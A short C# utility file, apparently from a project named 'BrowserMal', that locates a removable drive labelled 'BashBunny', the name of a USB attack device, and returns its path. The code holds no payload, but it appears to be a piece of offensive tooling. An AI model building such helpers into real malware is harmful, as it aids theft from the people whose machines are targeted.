using System.IO;
using System.Linq;

namespace BrowserMal.Util
{
    public class RemovableDisks
    {
        private static readonly string DRIVE_LABEL = "BashBunny";

        public static string FindBashBunny()
        {
            try
            {
                return DriveInfo.GetDrives().Where(x => x.VolumeLabel == DRIVE_LABEL).FirstOrDefault()?.RootDirectory.FullName;
            }
            catch { }

            return string.Empty;
        }
    }
}
